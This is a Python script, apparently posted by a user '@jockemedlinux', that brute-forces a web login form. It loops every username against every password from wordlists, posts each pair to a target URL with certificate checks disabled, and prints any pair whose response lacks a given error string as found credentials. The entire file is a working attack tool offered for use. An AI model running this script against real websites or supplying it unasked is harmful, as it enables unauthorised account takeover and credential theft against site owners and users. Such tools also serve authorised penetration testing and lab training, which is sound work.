#!/usr/bin/env python3
#brute.py : @jockemedlinux 2023-04-21      			#
#Version v1.0: Bruteforcing web login form easily.  #
#####################################################
import requests,argparse,sys,time

def login(url, username, password):
	r = requests.post(url, data={
		args.f1: username,
		args.f2: password,
		# "Submit": "Login", 	#If needed. Uncomment args.f3 below.

	}, verify = False)
	return r.text

if __name__ == "__main__":
	parser = argparse.ArgumentParser("bruteforcer.py")
	parser.add_argument("-H", type=str, help="The URL", required=True)
	parser.add_argument("-U", type=str, help="Usernames file", required=True)
	parser.add_argument("-P", type=str, help="Passwords file", required=True)
	parser.add_argument("-s", type=str, help="Error response from page. ('Username incorrect')", required=False)
	parser.add_argument("-f2", type=str, help="formdata #2", required=True)
	parser.add_argument("-f1", type=str, help="formdata #1", required=True)
	# parser.add_argument("-f3", type=str, help="formdata #3", required=True)
	args = parser.parse_args()

url = args.H
print("-" * 100)
print("\nAttacking: %s\n" % (url))
print("-" * 100)
creds = []
time.sleep(2)
try:
	with open(args.U, "r") as userfile:
		usernames = [line.strip() for line in userfile.read().split("\n") if line]
	with open(args.P, "r") as passfile:
		passwords = [line.strip() for line in passfile.read().split("\n") if line]
	counter = 1
	for username in usernames:
		for password in passwords:
			logins = login(url, username, password)
			if args.s in logins:
				print(f"Tried {username}:{password:<20} | so far we've done {counter} attempts")
				counter += 1
				continue
			else:
				print(f"\033[91m## Login Found ## \n{username}:{password}\033[0m")
				creds.append(username + ":" + password)
	if creds:
		print("\nThese credentials were found!")
		print(creds)
	else:
		print("\nNo credentials found..")
except KeyboardInterrupt:
	if creds:
		print("\nThese credentials were found!")
		print(creds)
	else:
		print("\nNo credentials found..")
	print("\nInterrupted by user. Quitting...")